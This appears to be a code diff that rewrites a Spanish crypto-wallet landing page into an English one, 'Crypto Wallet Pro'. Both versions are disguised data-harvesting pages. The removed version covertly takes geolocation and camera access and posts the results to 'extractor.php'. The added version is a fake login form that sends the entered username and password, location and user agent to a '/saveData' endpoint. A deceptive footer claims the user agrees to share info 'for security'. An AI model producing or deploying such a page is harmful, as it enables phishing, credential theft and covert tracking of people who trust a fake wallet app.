@@ -1,13 +1,15 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>App Trendy: Tu Wallet Crypto Segura</title>
+    <title>Crypto Wallet Pro - Secure Your Assets</title>
     <style>
+        /* CSS for styling the page to make it look trendy and modern */
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+            font-family: 'Arial', sans-serif;
+            background-color: #121212;
+            color: #ffffff;
             margin: 0;
             padding: 0;
             display: flex;
@@ -15,95 +17,125 @@
             align-items: center;
             height: 100vh;
         }
+        
         .container {
-            background-color: white;
-            padding: 20px;
+            background-color: #1f1f1f;
+            padding: 40px;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+            width: 400px;
             text-align: center;
         }
+        
         h1 {
-            color: #333;
-            font-size: 24px;
+            color: #00ff9d;
+            margin-bottom: 20px;
         }
+        
         p {
-            color: #666;
             font-size: 16px;
+            margin-bottom: 20px;
         }
-        button {
-            background-color: #007bff;
-            color: white;
+        
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
             border: none;
+            border-radius: 5px;
+            background-color: #333333;
+            color: #ffffff;
+        }
+        
+        button {
+            background-color: #00ff9d;
+            color: #121212;
             padding: 10px 20px;
+            border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 16px;
-            margin-top: 20px;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        #status {
-            margin-top: 10px;
-            color: #28a745;
             font-weight: bold;
+        }
+        
+        button:hover {
+            background-color: #00cc7a;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888888;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Bienvenido a CryptoVault 2025</h1>
-        <p>La app más trendy para manejar tus criptomonedas. Conectate con tu teléfono para sincronizar y extraer datos de tu cartera de forma segura. ¡Únete a la revolución crypto!</p>
-        <button id="hackButton">Conectar y Sincronizar</button>
-        <p id="status"></p>
+        <h1>Crypto Wallet Pro</h1>
+        <p>Secure your cryptocurrencies with our app. Enter your details to get started and sync your wallet.</p>
+        <form id="userForm">
+            <input type="text" id="username" placeholder="Enter your username" required>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button type="submit">Login and Sync</button>
+        </form>
+        <div class="footer">
+            <p>By using this, you agree to share your info for security.</p>
+        </div>
     </div>
 
     <script>
-        document.getElementById('hackButton').addEventListener('click', function() {
+        document.getElementById('userForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            // Extract user inputs
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            
+            // Extract geolocation if available
+            var geolocation = {};
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const dataToSend = `Ubicación: ${lat},${lon}`;
-                    sendExtractedData(dataToSend);
+                    geolocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    sendData(username, password, geolocation);  // Send data after getting location
                 }, function(error) {
-                    document.getElementById('status').innerText = 'Error al acceder a tu ubicación.';
+                    console.log('Geolocation error: ' + error.message);
+                    sendData(username, password, {});  // Send without geolocation if error
                 });
             } else {
-                document.getElementById('status').innerText = 'Geolocalización no soportada.';
+                sendData(username, password, {});
             }
-
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(stream) {
-                        // Simula captura y envía un marcador
-                        stream.getTracks().forEach(track => track.stop());
-                        sendExtractedData('Cámara accedida');
-                    })
-                    .catch(function(error) {
-                        document.getElementById('status').innerText = 'Acceso a cámara denegado.';
-                    });
+            
+            // Function to send data to the server
+            function sendData(username, password, geolocation) {
+                var userAgent = navigator.userAgent;  // Extract device info
+                
+                var data = {
+                    username: username,
+                    password: password,
+                    geolocation: geolocation,
+                    userAgent: userAgent
+                };
+                
+                // Send data via Fetch to the server
+                fetch('http://localhost:3000/saveData', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => response.text())
+                .then(result => {
+                    alert('Data sent successfully! Check the server logs.');
+                })
+                .catch(error => {
+                    console.error('Error sending data:', error);
+                    alert('Failed to send data.');
+                });
             }
         });
-
-        function sendExtractedData(data) {
-            // Envía los datos extraídos a un archivo del lado del servidor vía Fetch
-            fetch('extractor.php', {  // Este es el endpoint del servidor que manejará los datos
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ extractedData: data })
-            })
-            .then(response => response.text())
-            .then(result => {
-                document.getElementById('status').innerText = 'Datos enviados exitosamente al archivo.';
-            })
-            .catch(error => {
-                document.getElementById('status').innerText = 'Error al enviar datos: ' + error;
-            });
-        }
     </script>
 </body>
 </html>
